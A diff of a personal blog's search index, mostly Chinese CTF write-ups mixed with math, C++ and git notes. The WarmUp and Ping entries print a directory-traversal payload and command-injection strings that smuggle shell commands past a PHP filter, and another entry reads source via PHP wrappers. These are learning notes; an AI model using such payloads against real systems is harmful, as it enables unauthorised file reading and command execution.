@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2018]WarmUp</title>
+    <url>/2021/04/28/2018-WarmUp/</url>
+    <content><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h2 id="考点：文件包含-目录穿越"><a href="#考点：文件包含-目录穿越" class="headerlink" title="考点：文件包含+目录穿越"></a>考点：文件包含+目录穿越</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="comment">//传入file文件</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//要输出true的话page变量被设置了且类型为字符串</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            in_array(search,array,type)</span></span><br><span class="line"><span class="comment">            search：规定要在数组搜索的值</span></span><br><span class="line"><span class="comment">            array：规定值的搜索数组范围</span></span><br><span class="line"><span class="comment">            type：boolean？true检查类型：不检查类型</span></span><br><span class="line"><span class="comment">            搜索数组中是否存在指定的值。</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置</span></span><br><span class="line"><span class="comment">			mb_substr(String str，int start，int length);截断字符串</span></span><br><span class="line"><span class="comment">			*/</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//截取参数中的?之前的一部分，如果没有?则，截取所有参数。</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>？经过两次url解码还是？；故不必纠结urldecode</p>
+<p>构造?file=hint.php?../../../../../ffffllllaaaagggg</p>
+]]></content>
+  </entry>
+  <entry>
     <title>2019]EasySQL</title>
     <url>/2021/04/28/2019-EasySQL/</url>
     <content><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>构造  ‘ 1 or 1=1#’ 变成</p>
@@ -13,12 +22,47 @@
 ]]></content>
   </entry>
   <entry>
-    <title>2018]WarmUp</title>
-    <url>/2021/04/28/2018-WarmUp/</url>
-    <content><![CDATA[<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h2 id="考点：文件包含-目录穿越"><a href="#考点：文件包含-目录穿越" class="headerlink" title="考点：文件包含+目录穿越"></a>考点：文件包含+目录穿越</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="comment">//传入file文件</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//要输出true的话page变量被设置了且类型为字符串</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            in_array(search,array,type)</span></span><br><span class="line"><span class="comment">            search：规定要在数组搜索的值</span></span><br><span class="line"><span class="comment">            array：规定值的搜索数组范围</span></span><br><span class="line"><span class="comment">            type：boolean？true检查类型：不检查类型</span></span><br><span class="line"><span class="comment">            搜索数组中是否存在指定的值。</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			mb_strpos()：返回要查找的字符串在别一个字符串中首次出现的位置</span></span><br><span class="line"><span class="comment">			mb_substr(String str，int start，int length);截断字符串</span></span><br><span class="line"><span class="comment">			*/</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment">//截取参数中的?之前的一部分，如果没有?则，截取所有参数。</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+    <title>EBCDIC</title>
+    <url>/2021/05/09/EBCDIC/</url>
+    <content><![CDATA[<p>​        解压出一个EBCDIC.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">啌亣捆咇凁攨mｐm檯剤仯蝠蝰?</span><br></pre></td></tr></table></figure>
 
-<p>？经过两次url解码还是？；故不必纠结urldecode</p>
-<p>构造?file=hint.php?../../../../../ffffllllaaaagggg</p>
+<p>看不懂，只觉得是乱码</p>
+<p>百度了名字EBCDIC，是一种字符集编码，类似ASCII</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import codecs</span><br><span class="line">with io.open(&quot;EBCDIC.txt&quot;,&#39;r&#39;,encoding&#x3D;&#39;cp500&#39;) as fr:</span><br><span class="line">	for line in fr:</span><br><span class="line">		print(line)</span><br></pre></td></tr></table></figure>
+
+<p>encoding在python2.7不被使用，故需导入io包</p>
+]]></content>
+      <tags>
+        <tag>2021红帽杯</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ping</title>
+    <url>/2021/05/16/Ping/</url>
+    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"></span><br><span class="line">PING <span class="number">1</span> (<span class="number">0.0</span><span class="number">.0</span><span class="number">.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p> fxck your symbol</p>
+<p>&amp;/?*&lt;&gt;()[]{}</p>
+<p>fxck your space!</p>
+<p>空格</p>
+<p>bash</p>
+<p>flag的各种形式都拉黑了</p>
+<p>字符串拼接</p>
+<p>/?ip=1;d=g;cat$IFS$1fla$d.php</p>
+<p>内联执行</p>
+<p>把反引号内容的输出当输入</p>
+<p>/?ip=1;cat$IFS$1<code>ls</code></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Giterror</title>
+    <url>/2022/04/16/Giterror/</url>
+    <content><![CDATA[<h2 id="fatal-remote-error-The-unauthenticated-git-protocol-on-port-9418-is-no-longer-supported"><a href="#fatal-remote-error-The-unauthenticated-git-protocol-on-port-9418-is-no-longer-supported" class="headerlink" title="fatal: remote error:   The unauthenticated git protocol on port 9418 is no longer supported."></a>fatal: remote error:   The unauthenticated git protocol on port 9418 is no longer supported.</h2><p>在npm中的报错，在package.json和package-lock.json中找到</p>
+<p>git://github.com/…</p>
+<p>更改为</p>
+<p>github:…</p>
+<h2 id="fatal-unable-to-access-‘https-github-com-scriptcamp-podman-git-39-Failed-connect-to-github-com-443-Connection-refused"><a href="#fatal-unable-to-access-‘https-github-com-scriptcamp-podman-git-39-Failed-connect-to-github-com-443-Connection-refused" class="headerlink" title="fatal: unable to access ‘https://github.com/scriptcamp/podman.git/&#39;: Failed connect to github.com:443; Connection refused"></a>fatal: unable to access ‘<a href="https://github.com/scriptcamp/podman.git/&#39;">https://github.com/scriptcamp/podman.git/&#39;</a>: Failed connect to github.com:443; Connection refused</h2><p><a href="https://hub.fastgit.xyz/scriptcamp/podman.git">https://hub.fastgit.xyz/scriptcamp/podman.git</a><br><a href="https://fastgit.org/">https://fastgit.org/</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -49,48 +93,25 @@
 ]]></content>
   </entry>
   <entry>
-    <title>web</title>
-    <url>/2020/11/10/web/</url>
-    <content><![CDATA[<p>渗透准备：</p>
-<p>​    1 信息搜集（子域名，端口，waf，应用，whois…）</p>
-<p>渗透阶段：</p>
-<p>​    1 web脚本攻击（Poc/ExP，sqli，xss，csrf…）</p>
-<p>​    2 网络设备攻击（路由器…）</p>
-<p>​    3 社会工程学</p>
-<p>后渗透阶段</p>
-<p>​    1 内网渗透扩大战果</p>
-<p>​    2 提升权限</p>
-<p>​    3 后门（rootkit，木马…)</p>
-<p>​                Nnap端口扫描</p>
-<p>攻击阶段：</p>
-<p>​    SQL注入：</p>
-<p>​        盲注</p>
-<p>​        报错注入</p>
-<p>​        基于时间的注入</p>
-<p>​        宽字节注入</p>
-<p>​        二次注入</p>
-<p>​        sqlmap    <a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
-<p>XSS:</p>
-<p>​    打组合拳（CSRF ，SQL1，各种bypass）</p>
-<p><img src="C:\Users\17840\AppData\Roaming\Typora\typora-user-images\image-20201110133509117.png" alt="image-20201110133509117"></p>
-<p><img src="C:\Users\17840\AppData\Roaming\Typora\typora-user-images\image-20201110133744234.png" alt="image-20201110133744234"></p>
-<p>trick</p>
-<ul>
-<li>注释中藏flag，flag文字信息是背景色</li>
-<li>http header</li>
-<li>console</li>
-<li>cookie</li>
-</ul>
-<p>is_numberic</p>
-<p>封装协议（伪协议）</p>
-<p>PHP  访问各个输入/输出流，将一个文件包含进化成一个getshell</p>
-<p>phpinfo会被禁</p>
-]]></content>
+    <title>moonsql</title>
+    <url>/2021/05/14/moonsql/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>web</title>
     <url>/2020/11/12/web-1/</url>
     <content><![CDATA[<p>如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>rn踩坑</title>
+    <url>/2022/05/01/rn%E8%B8%A9%E5%9D%91/</url>
+    <content><![CDATA[<p>在RN开发过程中使用<a href="https://link.juejin.im/?target=https://github.com/oblador/react-native-vector-icons">react-native-vector-icons</a>，但是不加载icon，为方框里一个X</p>
+<p>需要连接</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">react-native link react-native-vector-icons &#x2F;&#x2F; 自动关联</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
   </entry>
   <entry>
@@ -107,81 +128,8 @@
 ]]></content>
   </entry>
   <entry>
-    <title>“高阶导数”</title>
-    <url>/2020/11/19/%E2%80%9C%E9%AB%98%E9%98%B6%E5%AF%BC%E6%95%B0%E2%80%9D/</url>
-    <content><![CDATA[<p>没好好学习高数结果连个高阶导数都不会</p>
-<p>方法一：递归，找规律，一般是有手就行</p>
-<p>方法二：要记两个莱布尼茨公式</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>多边形面积</title>
-    <url>/2020/11/15/%E5%A4%9A%E8%BE%B9%E5%BD%A2%E9%9D%A2%E7%A7%AF/</url>
-    <content><![CDATA[<p>在知道多边形每个点坐标的情况下可以使用该公式<br>$$<br>s=1/2|(x_1y_2-x_2y_1)+(x_2y_3-x_3y_2+…+(x_iy_{i+1}-x_{i+1}y_i)+(x_{i+1}y{i+2}-x_{i+2}y_{i+1})+(x_ny_1-x_1y_n))|<br>$$<br>内含叉乘尚未了结</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>扣工资</title>
-    <url>/2020/11/17/%E6%89%A3%E5%B7%A5%E8%B5%84/</url>
-    <content><![CDATA[<p>给小明发基本工资和奖金，但是每迟到一次就扣50 元，我觉得挺详细了，要是看不懂我的水平是救不了了</p>
-<p><code>#include&lt;bits/stdc++.h&gt;</code><br><code>//万能文件头</code><br><code>using namespace std;</code><br><code>//百度百科了但是没看懂</code><br><code>int main()</code></p>
-<p><code>&#123;</code><br>    <code>//定义变量bp即为基本工资，bo为奖金，N为迟到次数</code><br>    <code>int bp,bo,N;</code><br>    <code>//有输入则循环</code><br>    <code>while(!cin.eof())&#123;</code><br>        <code>//cin读取键盘输入分别给bp bo n</code><br>        <code>cin &gt;&gt;bp&gt;&gt;bo&gt;&gt;N;</code><br>        <code>//输出上面的输入，只是增加了显示后页面地直观性</code><br>        <code>cout &lt;&lt;&quot;基本工资：&quot;&lt;&lt;bp&lt;&lt;&quot; &quot;&lt;&lt;&quot;奖金：&quot;&lt;&lt;bo&lt;&lt;&quot; &quot;&lt;&lt;&quot;迟到次数：&quot;&lt;&lt;N&lt;&lt;&quot; &quot;&lt;&lt;endl;</code><br>        <code>//判断输入是否符合要求 “||”是或的意思</code><br>        <code>if(bp&lt;0||bo&lt;0||N&lt;0)&#123;</code><br>            <code>//输出，endl是换行</code><br>            <code>cout &lt;&lt;&quot;error&quot;&lt;&lt;endl;</code><br>        <code>&#125;else&#123;</code><br>            <code>//输出</code><br>            <code>cout &lt;&lt; &quot;可领：&quot;&lt;&lt;bp+bo-N*50&lt;&lt;endl;</code><br>        <code>&#125;</code><br>    <code>&#125;</code><br>``    </p>
-<pre><code>return 0;</code></pre>
-<p><code>&#125;</code></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>EBCDIC</title>
-    <url>/2021/05/09/EBCDIC/</url>
-    <content><![CDATA[<p>​        解压出一个EBCDIC.txt</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">啌亣捆咇凁攨mｐm檯剤仯蝠蝰?</span><br></pre></td></tr></table></figure>
-
-<p>看不懂，只觉得是乱码</p>
-<p>百度了名字EBCDIC，是一种字符集编码，类似ASCII</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import codecs</span><br><span class="line">with io.open(&quot;EBCDIC.txt&quot;,&#39;r&#39;,encoding&#x3D;&#39;cp500&#39;) as fr:</span><br><span class="line">	for line in fr:</span><br><span class="line">		print(line)</span><br></pre></td></tr></table></figure>
-
-<p>encoding在python2.7不被使用，故需导入io包</p>
-]]></content>
-      <tags>
-        <tag>2021红帽杯</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>moonsql</title>
-    <url>/2021/05/14/moonsql/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Giterror</title>
-    <url>/2022/04/16/Giterror/</url>
-    <content><![CDATA[<h2 id="fatal-remote-error-The-unauthenticated-git-protocol-on-port-9418-is-no-longer-supported"><a href="#fatal-remote-error-The-unauthenticated-git-protocol-on-port-9418-is-no-longer-supported" class="headerlink" title="fatal: remote error:   The unauthenticated git protocol on port 9418 is no longer supported."></a>fatal: remote error:   The unauthenticated git protocol on port 9418 is no longer supported.</h2><p>在npm中的报错，在package.json和package-lock.json中找到</p>
-<p>git://github.com/…</p>
-<p>更改为</p>
-<p>github:…</p>
-<h2 id="fatal-unable-to-access-‘https-github-com-scriptcamp-podman-git-39-Failed-connect-to-github-com-443-Connection-refused"><a href="#fatal-unable-to-access-‘https-github-com-scriptcamp-podman-git-39-Failed-connect-to-github-com-443-Connection-refused" class="headerlink" title="fatal: unable to access ‘https://github.com/scriptcamp/podman.git/&#39;: Failed connect to github.com:443; Connection refused"></a>fatal: unable to access ‘<a href="https://github.com/scriptcamp/podman.git/&#39;">https://github.com/scriptcamp/podman.git/&#39;</a>: Failed connect to github.com:443; Connection refused</h2><p><a href="https://hub.fastgit.xyz/scriptcamp/podman.git">https://hub.fastgit.xyz/scriptcamp/podman.git</a><br><a href="https://fastgit.org/">https://fastgit.org/</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Ping</title>
-    <url>/2021/05/16/Ping/</url>
-    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"></span><br><span class="line">PING <span class="number">1</span> (<span class="number">0.0</span><span class="number">.0</span><span class="number">.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-
-<p> fxck your symbol</p>
-<p>&amp;/?*&lt;&gt;()[]{}</p>
-<p>fxck your space!</p>
-<p>空格</p>
-<p>bash</p>
-<p>flag的各种形式都拉黑了</p>
-<p>字符串拼接</p>
-<p>/?ip=1;d=g;cat$IFS$1fla$d.php</p>
-<p>内联执行</p>
-<p>把反引号内容的输出当输入</p>
-<p>/?ip=1;cat$IFS$1<code>ls</code></p>
-]]></content>
-  </entry>
-  <entry>
     <title>‘备份文件漏洞’</title>
-    <url>/2021/05/09/%E2%80%98%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E2%80%99/</url>
+    <url>/2021/05/09/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>   常见的备份文件后缀名：</p>
 <p>git泄露</p>
 <p>.git </p>
@@ -205,20 +153,25 @@
 ]]></content>
   </entry>
   <entry>
-    <title>rn踩坑</title>
-    <url>/2022/05/01/rn%E8%B8%A9%E5%9D%91/</url>
-    <content><![CDATA[<p>在RN开发过程中使用<a href="https://link.juejin.im/?target=https://github.com/oblador/react-native-vector-icons">react-native-vector-icons</a>，但是不加载icon，为方框里一个X</p>
-<p>需要连接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">react-native link react-native-vector-icons &#x2F;&#x2F; 自动关联</span><br></pre></td></tr></table></figure>
-
-
-
+    <title>多边形面积</title>
+    <url>/2020/11/15/%E5%A4%9A%E8%BE%B9%E5%BD%A2%E9%9D%A2%E7%A7%AF/</url>
+    <content><![CDATA[<p>在知道多边形每个点坐标的情况下可以使用该公式<br>$$<br>s=1/2|(x_1y_2-x_2y_1)+(x_2y_3-x_3y_2+…+(x_iy_{i+1}-x_{i+1}y_i)+(x_{i+1}y{i+2}-x_{i+2}y_{i+1})+(x_ny_1-x_1y_n))|<br>$$<br>内含叉乘尚未了结</p>
 ]]></content>
   </entry>
   <entry>
-    <title>文件上传</title>
-    <url>/2022/09/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h2 id="BSidesCTF-2020-Had-a-bad-day"><a href="#BSidesCTF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCTF 2020]Had a bad day"></a>[BSidesCTF 2020]Had a bad day</h2><p><img src="%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.assets/image-20220921185646691.png" alt="image-20220921185646691"></p>
+    <title>扣工资</title>
+    <url>/2020/11/17/%E6%89%A3%E5%B7%A5%E8%B5%84/</url>
+    <content><![CDATA[<p>给小明发基本工资和奖金，但是每迟到一次就扣50 元，我觉得挺详细了，要是看不懂我的水平是救不了了</p>
+<p><code>#include&lt;bits/stdc++.h&gt;</code><br><code>//万能文件头</code><br><code>using namespace std;</code><br><code>//百度百科了但是没看懂</code><br><code>int main()</code></p>
+<p><code>&#123;</code><br>    <code>//定义变量bp即为基本工资，bo为奖金，N为迟到次数</code><br>    <code>int bp,bo,N;</code><br>    <code>//有输入则循环</code><br>    <code>while(!cin.eof())&#123;</code><br>        <code>//cin读取键盘输入分别给bp bo n</code><br>        <code>cin &gt;&gt;bp&gt;&gt;bo&gt;&gt;N;</code><br>        <code>//输出上面的输入，只是增加了显示后页面地直观性</code><br>        <code>cout &lt;&lt;&quot;基本工资：&quot;&lt;&lt;bp&lt;&lt;&quot; &quot;&lt;&lt;&quot;奖金：&quot;&lt;&lt;bo&lt;&lt;&quot; &quot;&lt;&lt;&quot;迟到次数：&quot;&lt;&lt;N&lt;&lt;&quot; &quot;&lt;&lt;endl;</code><br>        <code>//判断输入是否符合要求 “||”是或的意思</code><br>        <code>if(bp&lt;0||bo&lt;0||N&lt;0)&#123;</code><br>            <code>//输出，endl是换行</code><br>            <code>cout &lt;&lt;&quot;error&quot;&lt;&lt;endl;</code><br>        <code>&#125;else&#123;</code><br>            <code>//输出</code><br>            <code>cout &lt;&lt; &quot;可领：&quot;&lt;&lt;bp+bo-N*50&lt;&lt;endl;</code><br>        <code>&#125;</code><br>    <code>&#125;</code><br>``    </p>
+<pre><code>return 0;</code></pre>
+<p><code>&#125;</code></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>文件包含</title>
+    <url>/2022/09/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h2 id="BSidesCTF-2020-Had-a-bad-day"><a href="#BSidesCTF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCTF 2020]Had a bad day"></a>[BSidesCTF 2020]Had a bad day</h2><p><img src="%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220921185646691.png" alt="image-20220921185646691"></p>
 <p>使用php伪协议读取源码，发现被添加了一个.php</p>
 <p>本来以伪用截断添加%00后要解决路径问题</p>
 <p>但是不加php就出来base64了</p>
@@ -234,24 +187,31 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// flag&#123;5fb62336-06ec-4ac6-9015-89adf32da936&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
